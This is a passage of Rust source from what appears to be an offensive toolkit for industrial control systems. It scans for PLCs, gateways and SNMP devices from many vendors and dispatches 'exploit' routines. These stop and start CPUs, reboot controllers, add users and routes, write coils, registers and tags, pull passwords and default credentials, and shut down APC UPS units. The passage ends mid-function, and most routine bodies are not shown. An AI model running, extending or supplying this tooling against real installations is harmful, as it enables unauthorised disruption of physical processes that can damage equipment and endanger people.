        CapabilityKey::PhoenixWebVisit => "Phoenix WebVisit interface has not been identified",
        CapabilityKey::EwonHttp => "eWON HTTP interface has not been identified",
        CapabilityKey::EnipTcp => "EtherNet/IP TCP has not been confirmed",
        CapabilityKey::MitsubishiIdentity => "Mitsubishi identity has not been confirmed",
        CapabilityKey::MitsubishiControlUdp => "Mitsubishi UDP control path has not been confirmed",
        CapabilityKey::SlmpTcp => "SLMP TCP has not been confirmed",
        CapabilityKey::FinsTcp => "FINS TCP has not been confirmed",
        CapabilityKey::Iec104Tcp => "IEC 104 TCP has not been confirmed",
        CapabilityKey::SnmpUdp | CapabilityKey::SnmpWrite => "SNMP UDP has not been confirmed",
        CapabilityKey::SnmpApc => "APC UPS not identified via SNMP sysObjectID",
    }
}

fn unavailable_suffix(reason: Option<&str>) -> String {
    match reason {
        Some(reason) if reason.contains("Modbus") => " [no Modbus]".to_string(),
        Some(reason) if reason.contains("ADS") => " [no ADS]".to_string(),
        Some(reason) if reason.contains("SLMP") => " [no SLMP]".to_string(),
        Some(reason) if reason.contains("S7") => " [no S7]".to_string(),
        Some(reason) if reason.contains("FINS") => " [no FINS]".to_string(),
        Some(reason) if reason.contains("IEC 104") => " [no IEC104]".to_string(),
        Some(reason) if reason.contains("EtherNet/IP") => " [no ENIP]".to_string(),
        Some(reason) if reason.contains("UDP control") => " [no control]".to_string(),
        Some(reason) if reason.contains("web") => " [no web]".to_string(),
        Some(reason) if reason.contains("HTTP") => " [no http]".to_string(),
        Some(reason) if reason.contains("FC90") || reason.contains("TM221") => {
            " [model unknown]".to_string()
        }
        Some(_) => " [unavailable]".to_string(),
        None => String::new(),
    }
}

fn requires_confirmation(exploit: &ExploitDef) -> bool {
    matches!(
        exploit.risk,
        ExploitRisk::SensitiveRead | ExploitRisk::LongRunning | ExploitRisk::WriteControl
    )
}

fn parse_target_scan(raw: &str) -> Option<TargetScan> {
    let mut parts = raw.split_whitespace();
    let addr = parts.next()?;
    let mut transport = None;
    let mut vendor = None;
    for token in parts {
        if let Some(t) = parse_target_transport(token) {
            if transport.replace(t).is_some() {
                return None;
            }
        } else if is_target_vendor(token) {
            if vendor.replace(token.to_ascii_lowercase()).is_some() {
                return None;
            }
        } else {
            return None;
        }
    }

    let (ip, port) = if let Some((addr_ip, port_s)) = addr.rsplit_once(':') {
        let port = port_s.parse::<u16>().ok()?;
        if port == 0 {
            return None;
        }
        (addr_ip.to_string(), Some(port))
    } else {
        (addr.to_string(), None)
    };

    ip.parse::<std::net::Ipv4Addr>().ok()?;
    Some(TargetScan {
        ip,
        port,
        transport,
        vendor,
    })
}

fn parse_target_transport(token: &str) -> Option<TargetTransport> {
    match token.to_ascii_lowercase().as_str() {
        "udp" => Some(TargetTransport::Udp),
        "tcp" => Some(TargetTransport::Tcp),
        "both" => Some(TargetTransport::Both),
        _ => None,
    }
}

fn target_transport_label(transport: TargetTransport) -> &'static str {
    match transport {
        TargetTransport::Udp => "udp",
        TargetTransport::Tcp => "tcp",
        TargetTransport::Both => "both",
    }
}

fn is_target_vendor(token: &str) -> bool {
    let token = token.to_ascii_lowercase();
    ALL_VENDORS.iter().any(|&vendor| vendor == token)
}

fn field_str<'a>(fields: &'a Value, key: &str) -> Option<&'a str> {
    fields.get(key)?.as_str()
}

fn field_bool(fields: &Value, key: &str) -> bool {
    fields.get(key).and_then(Value::as_bool).unwrap_or(false)
}

fn field_bool_value(fields: &Value, key: &str) -> Option<bool> {
    fields.get(key).and_then(Value::as_bool)
}

fn field_port_value(fields: &Value, key: &str) -> Option<u16> {
    fields
        .get(key)?
        .as_u64()
        .and_then(|n| u16::try_from(n).ok())
}

fn is_schneider_identity_name(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    !name.contains("compatible")
        && (name.contains("schneider")
            || name.contains("modicon")
            || name.contains("telemecanique")
            || name.contains("m340")
            || name.contains("m580")
            || name.contains("quantum")
            || name.contains("premium")
            || name.contains("tm221")
            || name.contains("tm241")
            || name.contains("tm251"))
}

fn selected_transport(app: &App) -> Option<TargetTransport> {
    app.selected_device()
        .and_then(|d| d.fields.get("discovery_transport"))
        .and_then(|v| v.as_str())
        .and_then(parse_target_transport)
}

fn schneider_transport(transport: TargetTransport) -> crate::vendors::schneider::scan::Transport {
    use crate::vendors::schneider::scan::Transport;
    match transport {
        TargetTransport::Udp => Transport::Udp,
        TargetTransport::Tcp => Transport::Tcp,
        TargetTransport::Both => Transport::Both,
    }
}

fn mitsubishi_transport(transport: TargetTransport) -> crate::vendors::mitsubishi::scan::Transport {
    use crate::vendors::mitsubishi::scan::Transport;
    match transport {
        TargetTransport::Udp => Transport::Udp,
        TargetTransport::Tcp => Transport::Tcp,
        TargetTransport::Both => Transport::Both,
    }
}

fn schneider_device_info(d: crate::vendors::schneider::scan::SchneiderDevice) -> DeviceInfo {
    let ip = d.ip.clone();
    let mut fields = HashMap::new();
    let name_for_family = d.name.clone().unwrap_or_default();
    let identity_confirmed = d.identity_match
        || (matches!(d.discovery_transport.as_deref(), Some("udp"))
            && (d.name.is_some() || d.firmware.is_some()));
    let modbus_tcp_confirmed = d.protocol.as_deref() == Some("modbus_tcp") || d.port.is_some();
    let udp_confirmed =
        matches!(d.discovery_transport.as_deref(), Some("udp")) && identity_confirmed;
    let fc90_family = SchneiderFamily::from_name(&name_for_family);

    if let Some(name) = d.name {
        fields.insert("name".into(), Value::String(name));
    }
    if let Some(fw) = d.firmware {
        fields.insert("firmware".into(), Value::String(fw));
    }
    if let Some(protocol) = d.protocol {
        fields.insert("protocol".into(), Value::String(protocol));
    }
    if let Some(port) = d.port {
        fields.insert("port".into(), Value::Number(i64::from(port).into()));
        fields.insert("modbus_port".into(), Value::Number(i64::from(port).into()));
    } else {
        fields.insert(
            "port".into(),
            Value::Number(i64::from(crate::core::modbus::DEFAULT_PORT).into()),
        );
        fields.insert(
            "modbus_port".into(),
            Value::Number(i64::from(crate::core::modbus::DEFAULT_PORT).into()),
        );
    }
    if let Some(transport) = d.discovery_transport {
        fields.insert("discovery_transport".into(), Value::String(transport));
    }
    if let Some(unit_id) = d.modbus_unit_id {
        fields.insert(
            "modbus_unit_id".into(),
            Value::Number(i64::from(unit_id).into()),
        );
    }
    if identity_confirmed {
        fields.insert("web_port".into(), Value::Number(80i64.into()));
    }
    fields.insert(
        "cap_identity_confirmed".into(),
        Value::Bool(identity_confirmed),
    );
    fields.insert("cap_schneider_udp".into(), Value::Bool(udp_confirmed));
    fields.insert("cap_modbus_tcp".into(), Value::Bool(modbus_tcp_confirmed));
    fields.insert(
        "fc90_family".into(),
        Value::String(fc90_family.as_field().to_string()),
    );
    DeviceInfo {
        vendor: "schneider".into(),
        ip,
        fields,
    }
}

fn mitsubishi_device_info(d: crate::vendors::mitsubishi::scan::MitsubishiDevice) -> DeviceInfo {
    let ip = d.ip.clone();
    let mut fields = HashMap::new();
    let protocol = d.protocol.clone().unwrap_or_default();
    let discovery_transport = d.discovery_transport.clone().unwrap_or_default();
    fields.insert("plc_type".into(), Value::String(d.plc_type));
    if let Some(title) = d.title {
        fields.insert("title".into(), Value::String(title));
    }
    if let Some(comment) = d.comment {
        fields.insert("comment".into(), Value::String(comment));
    }
    if let Some(protocol) = d.protocol {
        fields.insert("protocol".into(), Value::String(protocol));
    }
    if let Some(port) = d.port {
        if matches!(d.discovery_transport.as_deref(), Some("tcp")) {
            fields.insert("port".into(), Value::Number(i64::from(port).into()));
            fields.insert("slmp_port".into(), Value::Number(i64::from(port).into()));
        } else {
            fields.insert(
                "port".into(),
                Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
            );
            fields.insert(
                "discovery_port".into(),
                Value::Number(i64::from(port).into()),
            );
            fields.insert(
                "slmp_port".into(),
                Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
            );
        }
    } else {
        fields.insert(
            "port".into(),
            Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
        );
        fields.insert(
            "slmp_port".into(),
            Value::Number(i64::from(crate::vendors::mitsubishi::slmp::DEFAULT_PORT).into()),
        );
    }
    if let Some(transport) = d.discovery_transport {
        fields.insert("discovery_transport".into(), Value::String(transport));
    }
    fields.insert("cap_mitsubishi_identity".into(), Value::Bool(true));
    fields.insert(
        "cap_gxworks_udp".into(),
        Value::Bool(protocol == "gxworks_udp" || discovery_transport == "udp"),
    );
    fields.insert(
        "cap_slmp_tcp".into(),
        Value::Bool(protocol == "slmp_tcp" || discovery_transport == "tcp"),
    );
    fields.insert("cap_slmp_udp".into(), Value::Bool(protocol == "slmp_udp"));
    DeviceInfo {
        vendor: "mitsubishi".into(),
        ip,
        fields,
    }
}

fn beckhoff_device_info(
    d: crate::vendors::beckhoff::scan::BeckhoffDevice,
    port: Option<u16>,
) -> DeviceInfo {
    let ip = d.ip.clone();
    let ads_tcp_fallback = d.name.starts_with("Beckhoff ADS TCP");
    let mut fields = HashMap::new();
    fields.insert("name".into(), Value::String(d.name));
    fields.insert("netid".into(), Value::String(d.netid_str));
    fields.insert("tc_version".into(), Value::String(d.tc_version));
    fields.insert("kernel".into(), Value::String(d.kernel));
    fields.insert("protocol".into(), Value::String("ads_tcp".into()));
    if ads_tcp_fallback {
        fields.insert("discovery_transport".into(), Value::String("tcp".into()));
    } else {
        fields.insert("discovery_port".into(), Value::Number(48899i64.into()));
        fields.insert("discovery_transport".into(), Value::String("udp".into()));
    }
    fields.insert(
        "port".into(),
        Value::Number(
            i64::from(port.unwrap_or(crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
        ),
    );
    fields.insert(
        "ads_port".into(),
        Value::Number(
            i64::from(port.unwrap_or(crate::vendors::beckhoff::scan::DEFAULT_ADS_PORT)).into(),
        ),
    );
    fields.insert(
        "web_port".into(),
        Value::Number(i64::from(crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into()),
    );
    fields.insert("cap_ads_tcp".into(), Value::Bool(true));
    fields.insert(
        "cap_ads_udp_discovery".into(),
        Value::Bool(!ads_tcp_fallback),
    );
    fields.insert("cap_beckhoff_web_candidate".into(), Value::Bool(true));
    DeviceInfo {
        vendor: "beckhoff".into(),
        ip,
        fields,
    }
}

fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let label = target.label();
        let _ = tx.send(ScanEvent::Output(format!("[*] Probing {label}...")));

        if matches!(target.vendor.as_deref(), Some("mitsubishi")) {
            use crate::vendors::mitsubishi::{scan, slmp};

            let port = target.port.unwrap_or(slmp::DEFAULT_PORT);
            let transport = target.transport.unwrap_or(TargetTransport::Both);
            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Mitsubishi targeted scan ({}, SLMP TCP port {port})...",
                target_transport_label(transport)
            )));
            if let Ok(devs) = scan::scan_ip_with_transport(
                &target.ip,
                3,
                true,
                port,
                mitsubishi_transport(transport),
            ) {
                if let Some(dev) = devs.into_iter().next() {
                    let plc_type = dev.plc_type.clone();
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Mitsubishi: {} ({plc_type})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(mitsubishi_device_info(dev)));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[-] {label} - no Mitsubishi response"
            )));
            let _ = tx.send(ScanEvent::Done(format!(
                "Scan of {label} complete (no result)"
            )));
            return;
        }

        if matches!(target.vendor.as_deref(), Some("beckhoff")) {
            use crate::vendors::beckhoff::scan;

            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Beckhoff targeted discovery (ADS TCP port {})...",
                target.port.unwrap_or(scan::DEFAULT_ADS_PORT)
            )));
            if let Ok(devs) =
                scan::discover_ip_with_port(&target.ip, 3, true, target.port.unwrap_or(0))
            {
                if let Some(dev) = devs.into_iter().next() {
                    let name = dev.name.clone();
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Beckhoff: {} ({name})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(beckhoff_device_info(
                        dev,
                        target.port,
                    )));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }
            let mut fields = HashMap::new();
            let ads_port = target.port.unwrap_or(scan::DEFAULT_ADS_PORT);
            fields.insert("port".into(), Value::Number(i64::from(ads_port).into()));
            fields.insert("ads_port".into(), Value::Number(i64::from(ads_port).into()));
            fields.insert(
                "web_port".into(),
                Value::Number(
                    i64::from(crate::vendors::beckhoff::webcontrol::DEFAULT_WEB_PORT).into(),
                ),
            );
            fields.insert("protocol".into(), Value::String("ads_tcp".into()));
            fields.insert("discovery_transport".into(), Value::String("tcp".into()));
            fields.insert("cap_ads_tcp".into(), Value::Bool(false));
            fields.insert("cap_ads_udp_discovery".into(), Value::Bool(false));
            fields.insert("cap_beckhoff_web_candidate".into(), Value::Bool(true));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                vendor: "beckhoff".into(),
                ip: target.ip.clone(),
                fields,
            }));
            let _ = tx.send(ScanEvent::Output(format!(
                "[!] {label} - no Beckhoff discovery response; stored with ADS port"
            )));
            let _ = tx.send(ScanEvent::Done(format!(
                "Scan of {label} complete (no result)"
            )));
            return;
        }

        if target.should_try_schneider() {
            use crate::core::modbus;
            use crate::vendors::schneider::scan;

            let port = target.port.unwrap_or(modbus::DEFAULT_PORT);
            let transport = target.transport.unwrap_or(TargetTransport::Both);
            let _ = tx.send(ScanEvent::Output(format!(
                "[*] Schneider targeted scan ({}, TCP port {port})...",
                target_transport_label(transport)
            )));
            if let Ok(devs) = scan::scan_ip_with_transport(
                &target.ip,
                3,
                true,
                port,
                schneider_transport(transport),
            ) {
                if let Some(dev) = devs.into_iter().next() {
                    let name = dev
                        .name
                        .clone()
                        .unwrap_or_else(|| "Schneider-compatible".into());
                    let _ = tx.send(ScanEvent::Output(format!(
                        "[+] Schneider: {} ({name})",
                        target.ip
                    )));
                    let _ = tx.send(ScanEvent::DeviceFound(schneider_device_info(dev)));
                    let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
                    return;
                }
            }

            if target.transport.is_some() {
                let _ = tx.send(ScanEvent::Output(format!(
                    "[-] {label} - no Schneider response"
                )));
                let _ = tx.send(ScanEvent::Done(format!(
                    "Scan of {label} complete (no result)"
                )));
                return;
            }
        }

        if let Some(info) = detect_device(&target.ip, 8) {
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] {} \u{2192} {}",
                target.ip, info.vendor
            )));
            let _ = tx.send(ScanEvent::DeviceFound(info));
            let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete")));
        } else {
            if let Some(port) = target.port {
                let mut fields = HashMap::new();
                fields.insert("port".into(), Value::Number(i64::from(port).into()));
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                    vendor: "unknown".into(),
                    ip: target.ip.clone(),
                    fields,
                }));
                let _ = tx.send(ScanEvent::Output(format!(
                    "[!] {label} - no device identified; stored with custom port"
                )));
            } else {
                let _ = tx.send(ScanEvent::Output(format!(
                    "[-] {} \u{2014} no device identified",
                    target.ip
                )));
            }
            let _ = tx.send(ScanEvent::Done(format!(
                "Scan of {label} complete (no result)"
            )));
        }
    });
}

fn spawn_broadcast_scan(scan_idx: usize, tx: mpsc::Sender<ScanEvent>) {
    std::thread::spawn(move || {
        let ifaces = get_interfaces();
        if ifaces.is_empty() {
            let _ = tx.send(ScanEvent::Done("No network interfaces found".into()));
            return;
        }
        let iface = ifaces[0].clone();
        let _ = tx.send(ScanEvent::Output(format!(
            "[*] Using interface {} ({})",
            iface.name, iface.ip
        )));

        if scan_idx == 0 {
            let _ = tx.send(ScanEvent::Output(
                "[*] Starting parallel broadcast scan...".into(),
            ));
            let mut handles = Vec::new();
            for vendor_idx in 1..=5 {
                let tx2 = tx.clone();
                let iface2 = iface.clone();
                handles.push(std::thread::spawn(move || {
                    run_vendor_broadcast(vendor_idx, &iface2, &tx2);
                }));
            }
            for h in handles {
                let _ = h.join();
            }
            let _ = tx.send(ScanEvent::Done("Parallel broadcast scan complete".into()));
        } else {
            run_vendor_broadcast(scan_idx, &iface, &tx);
            let _ = tx.send(ScanEvent::Done(format!(
                "{} scan complete",
                SCAN_ITEMS[scan_idx]
            )));
        }
    });
}

fn run_vendor_broadcast(vendor_idx: usize, iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    match vendor_idx {
        1 => scan_broadcast_beckhoff(iface, tx),
        2 => scan_broadcast_enip(iface, tx),
        3 => scan_broadcast_schneider(iface, tx),
        4 => scan_broadcast_mitsubishi(iface, tx),
        5 => scan_broadcast_ewon(iface, tx),
        _ => {}
    }
}

fn scan_broadcast_beckhoff(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::beckhoff::scan;
    if let Ok(devs) = scan::discover(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] Beckhoff: {ip} ({}, {})",
                d.name, d.tc_version
            )));
            let _ = tx.send(ScanEvent::DeviceFound(beckhoff_device_info(d, None)));
        }
    }
}

fn scan_broadcast_enip(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::enip::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let vendor_id_u32 = u32::from_str_radix(&d.vendor_id, 16).unwrap_or(0);
            let vendor = if [1u32, 5, 77].contains(&vendor_id_u32) {
                "rockwell"
            } else {
                "enip"
            };
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] EtherNet/IP: {ip} ({})",
                d.product_name
            )));
            let mut fields = HashMap::new();
            fields.insert("product_name".into(), Value::String(d.product_name));
            fields.insert("vendor_id".into(), Value::String(d.vendor_id));
            fields.insert("revision".into(), Value::String(d.revision));
            fields.insert("port".into(), Value::Number(44818i64.into()));
            fields.insert("enip_port".into(), Value::Number(44818i64.into()));
            fields.insert("cap_enip_tcp_identity".into(), Value::Bool(true));
            let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                vendor: vendor.into(),
                ip,
                fields,
            }));
        }
    }
}

fn scan_broadcast_schneider(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::schneider::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let name = d.name.clone().unwrap_or_default();
            let _ = tx.send(ScanEvent::Output(format!("[+] Schneider: {ip} ({name})")));
            let _ = tx.send(ScanEvent::DeviceFound(schneider_device_info(d)));
        }
    }
}

fn scan_broadcast_mitsubishi(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::mitsubishi::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            let ip = d.ip.clone();
            if ip.parse::<std::net::IpAddr>().is_err() {
                continue;
            }
            let _ = tx.send(ScanEvent::Output(format!(
                "[+] Mitsubishi: {ip} ({})",
                d.plc_type
            )));
            let _ = tx.send(ScanEvent::DeviceFound(mitsubishi_device_info(d)));
        }
    }
}

fn scan_broadcast_ewon(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
    use crate::vendors::ewon::scan;
    if let Ok(devs) = scan::scan(iface, 3, true) {
        for d in devs {
            if d.response_type != "device_info" {
                continue;
            }
            if let Some(ip) = d.ip {
                if ip.parse::<std::net::IpAddr>().is_err() {
                    continue;
                }
                let serial = d.serial.clone().unwrap_or_default();
                let _ = tx.send(ScanEvent::Output(format!(
                    "[+] eWON: {ip} (serial={serial})"
                )));
                let mut fields = HashMap::new();
                if let Some(mac) = d.mac {
                    fields.insert("mac".into(), Value::String(mac));
                }
                if !serial.is_empty() {
                    fields.insert("serial".into(), Value::String(serial));
                }
                fields.insert("http_port".into(), Value::Number(80i64.into()));
                fields.insert("cap_ewon_ipconf".into(), Value::Bool(true));
                fields.insert("cap_ewon_http_candidate".into(), Value::Bool(true));
                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                    vendor: "ewon".into(),
                    ip,
                    fields,
                }));
            }
        }
    }
}

// ─── Exploit runners ─────────────────────────────────────────────────────────

/// Column header + rule for the Rockwell tag table.
fn tag_header() -> [String; 2] {
    [
        format!(
            "  {:>6}  {:<42}  {:<14}  {:<4}  {:<18}  {}",
            "#", "Name", "Type", "Dims", "Value", "Type Word"
        ),
        format!(
            "  {:─>6}  {:─<42}  {:─<14}  {:─<4}  {:─<18}  {:─<9}",
            "", "", "", "", "", ""
        ),
    ]
}

/// Format one tag row — widths match `tag_header()`.
///
/// `base`  — base type name (e.g. "BOOL", "DINT", "STRUCT(0x012)")
/// `dims`  — dimension label ("1D" / "2D" / "3D" / "-")
/// `value` — decoded live value, or "[struct]" / "[array]" / "-"
/// `raw`   — raw 2-byte type word
fn fmt_tag_row(
    instance_id: i64,
    name: &str,
    base: &str,
    dims: &str,
    value: &str,
    raw: i64,
) -> String {
    format!(
        "  {instance_id:>6}  {name:<42}  {base:<14}  {dims:<4}  {value:<18}  0x{raw:04x}"
    )
}

fn run_exploit_for(
    vendor: &str,
    idx: usize,
    ip: &str,
    port: u16,
    input: &str,
    label: &str,
    tx: mpsc::Sender<ScanEvent>,
) {
    let vendor = vendor.to_lowercase();
    let ip = ip.to_string();
    let input = input.to_string();
    let label = label.to_string();

    std::thread::spawn(move || {
        let out = |msg: &str| {
            let _ = tx.send(ScanEvent::Output(msg.to_string()));
        };
        dispatch_exploit(&vendor, idx, &ip, port, &input, out, &tx);
        let _ = tx.send(ScanEvent::Done(format!("{label} @ {ip}")));
    });
}

#[allow(clippy::cognitive_complexity)]
fn dispatch_exploit(
    vendor: &str,
    idx: usize,
    ip: &str,
    port: u16,
    input: &str,
    out: impl Fn(&str),
    tx: &mpsc::Sender<ScanEvent>,
) {
    match (vendor, idx) {
        ("beckhoff", 0) => exploit_beckhoff_info(ip, port, &out),
        ("beckhoff", 1) => exploit_beckhoff_state(ip, port, "run", &out),
        ("beckhoff", 2) => exploit_beckhoff_state(ip, port, "config", &out),
        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, port, &out),
        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, port, input, &out),
        ("siemens", 0) => exploit_siemens_cpu(ip, port, input, &out),
        ("siemens", 1) => exploit_siemens_io(ip, port, input, &out),
        ("siemens", 2) => exploit_siemens_toggle(ip, port, input, &out),
        ("schneider" | "modicon", 0) => exploit_schneider_flash(ip, &out),
        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, &out),
        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", &out),
        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", &out),
        ("phoenix", 0) => exploit_phoenix_passwords(ip, port, &out),
        ("phoenix", 1) => exploit_phoenix_list_tags(ip, port, &out),
        ("phoenix", 2) => exploit_phoenix_read_tags(ip, port, &out),
        ("phoenix", 3) => exploit_phoenix_write_tag(ip, port, input, &out),
        ("phoenix", 4) => exploit_phoenix_info(ip, port, &out),
        ("ewon", 0) => exploit_ewon_creds(ip, port, input, &out),
        ("rockwell" | "enip", 0) => exploit_rockwell_identity(ip, port, &out),
        ("rockwell" | "enip", 1) => exploit_rockwell_tags(ip, port, &out),
        ("rockwell" | "enip", 2) => exploit_rockwell_read(ip, port, input, &out),
        ("rockwell" | "enip", 3) => exploit_rockwell_write(ip, port, input, &out),
        ("mitsubishi", 0) => exploit_mitsubishi_info(ip, &out),
        ("mitsubishi", 1) => exploit_slmp_map(ip, port, "quick", &out),
        ("mitsubishi", 2) => exploit_slmp_map(ip, port, "common", &out),
        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, port, &out),
        ("beckhoff", 6) => exploit_beckhoff_add_route(ip, input, &out),
        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, port, &out),
        ("siemens", 3) => exploit_siemens_set_outputs(ip, port, input, &out),
        ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, &out),
        ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, &out),
        ("siemens", 6) => exploit_siemens_read_db(ip, port, input, &out),
        ("schneider" | "modicon", 4) => exploit_modbus_map(ip, port, "quick", &out),
        ("schneider" | "modicon", 5) => exploit_modbus_map(ip, port, "common", &out),
        ("schneider" | "modicon", 6) => exploit_modbus_map(ip, port, input, &out),
        ("schneider" | "modicon", 7) => exploit_modbus_map(ip, port, "all", &out),
        ("schneider" | "modicon", 8) => exploit_modbus_holding(ip, port, input, &out),
        ("schneider" | "modicon", 9) => exploit_modbus_coils(ip, port, input, &out),
        ("schneider" | "modicon", 10) => exploit_modbus_input(ip, port, input, &out),
        ("schneider" | "modicon", 11) => exploit_modbus_discrete(ip, port, input, &out),
        ("phoenix", 5) => exploit_phoenix_control_ilc150(ip, port, input, &out),
        ("phoenix", 6) => exploit_phoenix_control_ilc390(ip, port, input, &out),
        ("mitsubishi", 3) => exploit_slmp_map(ip, port, input, &out),
        ("mitsubishi", 4) => exploit_slmp_map(ip, port, "all", &out),
        ("mitsubishi", 5) => exploit_mitsubishi_state(ip, "run", &out),
        ("mitsubishi", 6) => exploit_mitsubishi_state(ip, "stop", &out),
        ("mitsubishi", 7) => exploit_mitsubishi_set_pause(ip, &out),
        ("mitsubishi", 8) => exploit_mitsubishi_read_d(ip, port, input, &out),
        ("mitsubishi", 9) => exploit_mitsubishi_read_m(ip, port, input, &out),
        ("mitsubishi", 10) => exploit_slmp_write_d(ip, port, input, &out),
        ("mitsubishi", 11) => exploit_slmp_write_m(ip, port, input, &out),
        ("siemens", 7) => exploit_siemens_write_db(ip, port, input, &out),
        ("siemens", 8) => exploit_siemens_try_defaults(ip, port, &out),
        ("beckhoff", 8) => exploit_beckhoff_write_symbol(ip, port, input, &out),
        ("schneider" | "modicon", 12) => exploit_modbus_write_coil(ip, port, input, &out),
        ("schneider" | "modicon", 13) => exploit_modbus_write_register(ip, port, input, &out),
        ("schneider" | "modicon", 14) => {
            exploit_modbus_write_registers(ip, port, input, &out);
        }
        ("schneider" | "modicon", 15) => exploit_fc90_stop(ip, port, &out),
        ("schneider" | "modicon", 16) => exploit_fc90_start(ip, port, &out),
        ("schneider" | "modicon", 17) => exploit_fc90_stop_tm221(ip, port, &out),
        ("schneider" | "modicon", 18) => exploit_fc90_start_tm221(ip, port, &out),
        ("schneider" | "modicon", 19) => exploit_fc90_force(ip, port, input, &out),
        ("omron", 0) => exploit_omron_info(ip, port, &out),
        ("omron", 1) => exploit_omron_read_dm(ip, port, input, &out),
        ("omron", 2) => exploit_omron_write_dm(ip, port, input, &out),
        ("omron", 3) => exploit_omron_cpu_status(ip, port, &out),
        ("omron", 4) => exploit_omron_cpu_run(ip, port, &out),
        ("omron", 5) => exploit_omron_cpu_stop(ip, port, &out),
        ("iec104", 0) => exploit_iec104_gi(ip, port, &out),
        ("iec104", 1) => exploit_iec104_sc_on(ip, port, input, &out),
        ("iec104", 2) => exploit_iec104_sc_off(ip, port, input, &out),
        ("iec104", 3) => exploit_iec104_dc(ip, port, input, &out),
        ("snmp", 0) => exploit_snmp_sys_info(ip, port, &out),
        ("snmp", 1) => exploit_snmp_interfaces(ip, port, &out),
        ("snmp", 2) => exploit_snmp_topology(ip, port, &out),
        ("snmp", 3) => exploit_snmp_community_scan(ip, port, &out),
        ("snmp", 4) => exploit_snmp_cve_probe(ip, port, &out),
        ("snmp", 5) => exploit_snmp_walk(ip, port, input, &out),
        ("snmp", 6) => exploit_snmp_test_write(ip, port, input, &out),
        ("snmp", 7) => exploit_snmp_apc_status(ip, port, &out),
        ("snmp", 8) => exploit_snmp_apc_shutdown(ip, port, input, &out),
        _ => {
            // Auto-detect rescan: emit a DeviceFound event
            out(&format!("[*] Auto-detecting {ip}..."));
            if let Some(info) = detect_device(ip, 8) {
                out(&format!("[+] {} \u{2192} {}", ip, info.vendor));
                let _ = tx.send(ScanEvent::DeviceFound(info));
            } else {
                out(&format!("[-] {ip} — no device identified"));
            }
        }
    }
}

fn exploit_beckhoff_info(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Discovering Beckhoff at {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
        Some(dev) => {
            let state = scan::get_state(&dev, &local_netid, port);
            out(&format!("  State:   {state}"));
            match scan::get_device_info_full(&dev, &local_netid, port) {
                Some(info) => {
                    out(&format!("  Name:    {}", info.name));
                    out(&format!("  NetID:   {}", info.netid));
                    out(&format!("  TwinCAT: {}", info.tc_version));
                    if let Some(os) = &info.os_name {
                        out(&format!("  OS:      {os}"));
                    }
                }
                None => out("[-] Could not retrieve full device info"),
            }
        }
        None => out("[-] No Beckhoff device responded"),
    }
}

fn exploit_beckhoff_state(ip: &str, port: u16, state: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    out(&format!("[*] Setting TwinCAT state to {state} on {ip}..."));
    match scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        }) {
